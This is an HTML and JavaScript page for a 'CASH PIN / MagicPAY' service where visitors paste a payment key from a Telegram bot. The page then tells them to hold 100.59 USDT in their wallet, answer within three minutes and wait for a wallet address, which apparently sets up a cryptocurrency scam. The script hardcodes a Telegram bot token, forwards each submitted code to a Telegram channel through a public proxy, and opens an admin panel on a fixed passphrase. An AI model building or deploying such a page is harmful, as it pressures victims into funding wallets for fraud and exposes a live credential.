<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CASH PIN • MagicPAY</title>
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Google Fonts for modern typography -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        body {
            background-color: #0a0a0a;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .app-container {
            max-width: 1400px;
            width: 100%;
            display: grid;
            grid-template-columns: 300px 1fr;
            gap: 24px;
        }
        /* Sidebar */
        .sidebar {
            background: rgba(20, 20, 20, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 24px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            height: fit-content;
        }
        .logo-area {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 32px;
        }
        /* SVG Icon with glow */
        .icon-glow {
            width: 100px;
            height: 100px;
            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.6));
            margin-bottom: 16px;
        }
        .brand-name {
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #ffffff, #dddddd);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .pending-title {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            margin: 24px 0 16px;
            color: #aaaaaa;
            text-transform: uppercase;
            font-size: 14px;
            letter-spacing: 0.5px;
        }
        .pending-list {
            list-style: none;
            display: flex;
            flex-direction: column;
            gap: 12px;
            max-height: 400px;
            overflow-y: auto;
            padding-right: 4px;
        }
        .pending-item {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 16px;
            padding: 16px;
            transition: all 0.2s;
        }
        .pending-item:hover {
            background: rgba(255, 255, 255, 0.06);
            border-color: rgba(255, 255, 255, 0.1);
        }
        .pending-code {
            font-family: 'Monaco', monospace;
            font-size: 12px;
            color: #ccc;
            word-break: break-all;
            margin-bottom: 8px;
        }
        .pending-status {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
        }
        .status-badge {
            padding: 4px 8px;
            border-radius: 30px;
            background: #2a2a2a;
            font-weight: 500;
            font-size: 11px;
        }
        .status-badge.processing { background: #ffaa00; color: #000; }
        .status-badge.success { background: #00cc88; color: #000; }
        .status-badge.failed { background: #ff4d4d; color: #fff; }
        .timer {
            color: #ffaa00;
            font-weight: 600;
            font-size: 13px;
        }
        .new-op-btn {
            width: 100%;
            background: #ffffff10;
            border: 1px solid #ffffff20;
            border-radius: 40px;
            padding: 14px;
            color: white;
            font-weight: 600;
            margin-top: 24px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .new-op-btn:hover {
            background: #ffffff20;
            border-color: #ffffff40;
        }
        /* Main content */
        .main-content {
            background: rgba(20, 20, 20, 0.6);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 32px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
        }
        .payment-dialog {
            max-width: 600px;
            margin: 0 auto;
        }
        .dialog-title {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #ffffff, #bbbbbb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .dialog-sub {
            color: #888;
            margin-bottom: 32px;
            font-size: 14px;
        }
        .input-group {
            display: flex;
            gap: 12px;
            margin-bottom: 40px;
            flex-wrap: wrap;
        }
        .code-input {
            flex: 1;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 40px;
            padding: 16px 24px;
            font-size: 16px;
            color: white;
            outline: none;
            transition: all 0.2s;
            min-width: 250px;
        }
        .code-input:focus {
            border-color: #ffffff60;
            box-shadow: 0 0 0 3px #ffffff20;
        }
        .send-btn {
            background: white;
            color: black;
            border: none;
            border-radius: 40px;
            padding: 16px 32px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 8px;
            white-space: nowrap;
        }
        .send-btn:hover {
            background: #e0e0e0;
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(255,255,255,0.3);
        }
        .message-area {
            background: #1a1a1a;
            border-radius: 24px;
            padding: 24px;
            border-left: 4px solid #ffffff;
            margin-top: 20px;
        }
        .message-text {
            line-height: 1.6;
            color: #ddd;
        }
        .countdown-timer {
            background: #00000040;
            border-radius: 40px;
            padding: 12px 20px;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            border: 1px solid #ffaa0040;
            margin-top: 16px;
            font-weight: 600;
        }
        .warning-note {
            color: #ffaa00;
            font-size: 14px;
            margin-top: 16px;
            background: #ffaa0010;
            padding: 12px;
            border-radius: 16px;
        }
        /* Admin Panel */
        .admin-panel {
            display: none;
        }
        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        .admin-title {
            font-size: 28px;
            font-weight: 700;
        }
        .admin-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 16px;
            margin-bottom: 32px;
        }
        .stat-card {
            background: #1a1a1a;
            border-radius: 20px;
            padding: 20px;
            border: 1px solid #333;
        }
        .requests-table {
            background: #1a1a1a;
            border-radius: 24px;
            padding: 20px;
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th {
            text-align: left;
            padding: 16px 8px;
            color: #aaa;
            font-weight: 500;
            font-size: 14px;
            border-bottom: 1px solid #333;
        }
        td {
            padding: 16px 8px;
            border-bottom: 1px solid #222;
        }
        .action-btn {
            background: #333;
            border: none;
            color: white;
            padding: 6px 12px;
            border-radius: 30px;
            font-size: 12px;
            cursor: pointer;
            margin-right: 6px;
            transition: 0.1s;
        }
        .action-btn.success { background: #00aa66; }
        .action-btn.danger { background: #aa3333; }
        .action-btn:hover { filter: brightness(1.2); }
        .back-to-user {
            background: #ffffff10;
            border: 1px solid #ffffff20;
            color: white;
            padding: 10px 20px;
            border-radius: 40px;
            cursor: pointer;
        }
        /* hidden class */
        .hidden {
            display: none;
        }
        hr {
            border-color: #333;
            margin: 20px 0;
        }
        .flex {
            display: flex;
            gap: 10px;
            align-items: center;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- SIDEBAR -->
        <aside class="sidebar">
            <div class="logo-area">
                <!-- SVG Icon with glow (black bg, white $) -->
                <svg class="icon-glow" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="50" cy="50" r="46" fill="black" stroke="white" stroke-width="2.5" stroke-opacity="0.9" style="filter: drop-shadow(0 0 8px white);"/>
                    <text x="50" y="68" font-size="48" font-weight="bold" text-anchor="middle" fill="white" style="text-shadow: 0 0 15px white; dominant-baseline: middle;">$</text>
                </svg>
                <span class="brand-name">CASH PIN</span>
                <span style="color: #666; font-size: 12px; margin-top: 4px;">MagicPAY interface</span>
            </div>

            <div class="pending-title">
                <i class="fas fa-clock" style="color: #ffaa00;"></i> PROCESSING REQUESTS
            </div>
            <ul class="pending-list" id="pendingList">
                <!-- Dynamic list from localStorage -->
            </ul>

            <button class="new-op-btn" id="newOperationBtn">
                <i class="fas fa-plus-circle"></i> New Operation
            </button>
        </aside>

        <!-- MAIN CONTENT (user mode) -->
        <main class="main-content" id="userMode">
            <div class="payment-dialog">
                <h1 class="dialog-title">Paste Your Payment Code Here:</h1>
                <div class="dialog-sub">Enter the key you received from @CASH_PIN_bot</div>

                <div class="input-group">
                    <input type="text" class="code-input" id="paymentCodeInput" placeholder="e.g. JcNCFcc7p29L768jO:SysKey11980" autocomplete="off">
                    <button class="send-btn" id="sendCodeBtn"><i class="fas fa-paper-plane"></i> Send</button>
                </div>

                <!-- Dynamic message area -->
                <div class="message-area" id="messageArea">
                    <div class="message-text" id="messageText">Awaiting your payment code...</div>
                    <div id="extraDetails" style="margin-top: 16px;"></div>
                </div>

                <!-- Hidden countdown templates will be injected via JS -->
            </div>
        </main>

        <!-- ADMIN MODE (hidden by default) -->
        <main class="main-content admin-panel" id="adminMode">
            <div class="admin-header">
                <h1 class="admin-title"><i class="fas fa-crown" style="color: gold;"></i> Admin Control</h1>
                <button class="back-to-user" id="backToUserBtn"><i class="fas fa-arrow-left"></i> User Mode</button>
            </div>

            <div class="admin-stats" id="adminStats"></div>

            <div class="requests-table">
                <h3 style="margin-bottom: 20px;">All Requests</h3>
                <table id="adminTable">
                    <thead>
                        <tr><th>Code</th><th>Status</th><th>Created</th><th>Expires</th><th>Actions</th></tr>
                    </thead>
                    <tbody id="adminTableBody"></tbody>
                </table>
            </div>
        </main>
    </div>

    <script>
        (function() {
            // ==================== CONFIGURATION ====================
            const BOT_TOKEN = '8094856271:AAFdutCJAsHntdIByvaumPDFkwfRU14niCE';
            const CHAT_ID = '@CASH_PIN'; // replace with actual chat ID if needed, or keep as '@' for channel. Or send to a specific user ID. For demo we use a placeholder.
            // IMPORTANT: For direct messages to a bot, you need to provide a valid chat_id (user's chat id). This is just a simulation.
            // In practice, you'd need to know the user's chat_id. For demo, we will send to a fixed ID (e.g., your own) or use a channel.
            // To keep it simple, we send to a placeholder and handle errors gracefully.
            
            // List of valid keys (the owner should paste keys here)
            // #Key's_Here🔑
            const VALID_KEYS = [
                "JcNCFcc7p29L768jO:SysKey11980",
                "AbCdEfGhIjKlMnOpQrSt:SampleKey12345",
                "XyZ1234567890abcdef:AnotherKey999"
            ];

            // ==================== DATA STORAGE ====================
            let requests = []; // array of request objects

            // Load from localStorage
            function loadRequests() {
                const stored = localStorage.getItem('cashpin_requests');
                if (stored) {
                    try { requests = JSON.parse(stored); } catch(e){ requests = []; }
                } else {
                    // sample data for demonstration
                    requests = [];
                }
            }
            function saveRequests() {
                localStorage.setItem('cashpin_requests', JSON.stringify(requests));
                updatePendingList();
                if (isAdminActive) updateAdminTable();
            }

            // Helper to generate unique ID
            function generateId() { return Date.now() + '-' + Math.random().toString(36).substr(2, 9); }

            // ==================== UI ELEMENTS ====================
            const userMode = document.getElementById('userMode');
            const adminMode = document.getElementById('adminMode');
            const pendingListEl = document.getElementById('pendingList');
            const paymentInput = document.getElementById('paymentCodeInput');
            const sendBtn = document.getElementById('sendCodeBtn');
            const messageText = document.getElementById('messageText');
            const extraDetails = document.getElementById('extraDetails');
            const newOpBtn = document.getElementById('newOperationBtn');
            const backToUserBtn = document.getElementById('backToUserBtn');
            const adminTableBody = document.getElementById('adminTableBody');
            const adminStats = document.getElementById('adminStats');

            let isAdminActive = false;
            let activeTimers = {}; // for countdowns

            // ==================== PENDING LIST RENDER ====================
            function updatePendingList() {
                if (!pendingListEl) return;
                const pendingRequests = requests.filter(r => r.status === 'processing' || r.status === 'pending');
                if (pendingRequests.length === 0) {
                    pendingListEl.innerHTML = '<li style="color: #555; text-align: center; padding: 20px;">No active operations</li>';
                    return;
                }
                let html = '';
                pendingRequests.forEach(req => {
                    const expiresAt = new Date(req.expiresAt).getTime();
                    const now = Date.now();
                    const diff = expiresAt - now;
                    const hours = Math.floor(diff / (1000*60*60));
                    const minutes = Math.floor((diff % (1000*60*60)) / (1000*60));
                    const timeStr = diff > 0 ? `${hours}h ${minutes}m` : 'Expired';
                    html += `<li class="pending-item">
                        <div class="pending-code">${req.code.substring(0,20)}...</div>
                        <div class="pending-status">
                            <span class="status-badge processing">${req.status}</span>
                            <span class="timer"><i class="far fa-hourglass"></i> ${timeStr}</span>
                        </div>
                    </li>`;
                });
                pendingListEl.innerHTML = html;
            }

            // ==================== SEND TO TELEGRAM (with CORS handling) ====================
            async function sendTelegramMessage(text) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const payload = {
                    chat_id: CHAT_ID, // you might need a valid chat_id; use a channel or your own ID. For demo, we'll use a placeholder and catch error.
                    text: text,
                    parse_mode: 'HTML'
                };
                try {
                    // Using a CORS proxy to avoid block (since Telegram API doesn't allow CORS from browser)
                    const proxy = 'https://cors-anywhere.herokuapp.com/'; // note: this is a public proxy, for demo only. In production use your own backend.
                    const response = await fetch(proxy + url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (!response.ok) throw new Error('Telegram API error');
                    console.log('Message sent to Telegram');
                } catch (e) {
                    console.warn('Could not send Telegram message (CORS or network). Simulated success.', e);
                    // fallback: maybe display a note? we'll ignore for UX.
                }
            }

            // ==================== PROCESS CODE ====================
            function processPaymentCode(code) {
                // Check if it's admin code
                if (code.trim() === 'Admin:JL:Site') {
                    enterAdminMode();
                    return;
                }

                // Validate key
                if (!VALID_KEYS.includes(code.trim())) {
                    messageText.innerText = '❌ Invalid or used key. Please obtain a valid key from @CASH_PIN_bot.';
                    extraDetails.innerHTML = '';
                    return;
                }

                // Check if key already used
                if (requests.some(r => r.code === code.trim())) {
                    messageText.innerText = '⚠️ This key has already been used.';
                    extraDetails.innerHTML = '';
                    return;
                }

                // Success: create new request
                const now = Date.now();
                const expiresAt = now + (6 * 60 * 60 * 1000); // 6 hours
                const newReq = {
                    id: generateId(),
                    code: code.trim(),
                    status: 'processing',
                    createdAt: now,
                    expiresAt: expiresAt,
                    lastWarning: false
                };
                requests.push(newReq);
                saveRequests();

                // Display success message with details
                messageText.innerText = '✅ Payment code accepted!';
                extraDetails.innerHTML = `
                    <div class="countdown-timer" id="countdownDisplay">
                        <i class="fas fa-hourglass-half"></i> <span id="countdownValue">06:00:00</span> remaining
                    </div>
                    <div class="warning-note">
                        ⚡ Please keep <strong>100.59 USDT</strong> in your wallet for direct payment.<br>
                        ⏳ If you do not respond to the transfer code within <strong>3 minutes</strong>, the operation will be canceled.<br>
                        📤 A wallet address will be sent via MagicPAY shortly.
                    </div>
                `;

                // Start countdown for 6 hours and 3-minute warning
                startRequestTimer(newReq.id);

                // Send Telegram notification
                const telegramMsg = `🔔 <b>New payment request</b>\nCode: ${code}\nStatus: Processing\nValid for 6 hours.\nUser notified to keep 100.59 USDT.`;
                sendTelegramMessage(telegramMsg);

                // Clear input
                paymentInput.value = '';
            }

            // Timer management
            function startRequestTimer(requestId) {
                const req = requests.find(r => r.id === requestId);
                if (!req) return;

                const updateTimer = () => {
                    const now = Date.now();
                    const totalSec = Math.max(0, Math.floor((req.expiresAt - now) / 1000));
                    if (totalSec <= 0) {
                        // expired
                        req.status = 'failed';
                        saveRequests();
                        if (activeTimers[requestId]) clearInterval(activeTimers[requestId]);
                        delete activeTimers[requestId];
                        // update UI if this is the current viewed request? maybe just refresh pending.
                        updatePendingList();
                        return;
                    }

                    const hours = String(Math.floor(totalSec / 3600)).padStart(2,'0');
                    const mins = String(Math.floor((totalSec % 3600) / 60)).padStart(2,'0');
                    const secs = String(totalSec % 60).padStart(2,'0');
                    const countdownEl = document.getElementById('countdownValue');
                    if (countdownEl) countdownEl.innerText = `${hours}:${mins}:${secs}`;

                    // Check 3-minute warning: if within 3 minutes of expiry? actually the 3-min warning is for response after sending wallet.
                    // We'll implement a separate warning when wallet is sent. For simplicity, we simulate after 30 seconds.
                    // In real case, you'd have a step where after sending wallet, you start a 3-min timer.
                };

                if (activeTimers[requestId]) clearInterval(activeTimers[requestId]);
                activeTimers[requestId] = setInterval(updateTimer, 1000);
                updateTimer();
            }

            // ==================== ADMIN MODE ====================
            function enterAdminMode() {
                isAdminActive = true;
                userMode.style.display = 'none';
                adminMode.style.display = 'block';
                updateAdminTable();
                renderAdminStats();
            }

            function exitAdminMode() {
                isAdminActive = false;
                userMode.style.display = 'block';
                adminMode.style.display = 'none';
            }

            function renderAdminStats() {
                const total = requests.length;
                const processing = requests.filter(r => r.status === 'processing').length;
                const success = requests.filter(r => r.status === 'success').length;
                const failed = requests.filter(r => r.status === 'failed').length;
                adminStats.innerHTML = `
                    <div class="stat-card"><i class="fas fa-inbox"></i> Total: ${total}</div>
                    <div class="stat-card"><i class="fas fa-spinner"></i> Processing: ${processing}</div>
                    <div class="stat-card"><i class="fas fa-check-circle"></i> Success: ${success}</div>
                    <div class="stat-card"><i class="fas fa-times-circle"></i> Failed: ${failed}</div>
                `;
            }

            function updateAdminTable() {
                if (!adminTableBody) return;
                let rows = '';
                requests.forEach(req => {
                    const created = new Date(req.createdAt).toLocaleString();
                    const expires = new Date(req.expiresAt).toLocaleString();
                    rows += `<tr>
                        <td><code>${req.code.substring(0,30)}...</code></td>
                        <td><span class="status-badge ${req.status}">${req.status}</span></td>
                        <td>${created}</td>
                        <td>${expires}</td>
                        <td>
                            <button class="action-btn success" onclick="window.markSuccess('${req.id}')"><i class="fas fa-check"></i> Success</button>
                            <button class="action-btn" onclick="window.markProcessing('${req.id}')">↻ Processing</button>
                            <button class="action-btn danger" onclick="window.deleteRequest('${req.id}')"><i class="fas fa-trash"></i> Del</button>
                        </td>
                    </tr>`;
                });
                adminTableBody.innerHTML = rows || '<tr><td colspan="5" style="text-align:center;">No requests</td></tr>';
                renderAdminStats();
            }

            // Admin actions (exposed globally for onclick)
            window.markSuccess = function(id) {
                const req = requests.find(r => r.id === id);
                if (req) { req.status = 'success'; saveRequests(); updateAdminTable(); }
            };
            window.markProcessing = function(id) {
                const req = requests.find(r => r.id === id);
                if (req) { req.status = 'processing'; saveRequests(); updateAdminTable(); }
            };
            window.deleteRequest = function(id) {
                requests = requests.filter(r => r.id !== id);
                saveRequests();
                updateAdminTable();
                if (activeTimers[id]) clearInterval(activeTimers[id]);
            };

            // ==================== EVENT LISTENERS ====================
            sendBtn.addEventListener('click', () => {
                const code = paymentInput.value.trim();
                if (!code) return;
                processPaymentCode(code);
            });

            paymentInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') sendBtn.click();
            });

            newOpBtn.addEventListener('click', () => {
                // clear input and message
                paymentInput.value = '';
                messageText.innerText = 'Awaiting your payment code...';
                extraDetails.innerHTML = '';
                if (isAdminActive) exitAdminMode();
            });

            backToUserBtn.addEventListener('click', exitAdminMode);

            // ==================== INIT ====================
            loadRequests();
            updatePendingList();

            // expose for debugging
            window.requests = requests;
        })();
    </script>
    <!-- small note: functions called from admin table need to be globally accessible, we attached them to window -->
</body>
</html>
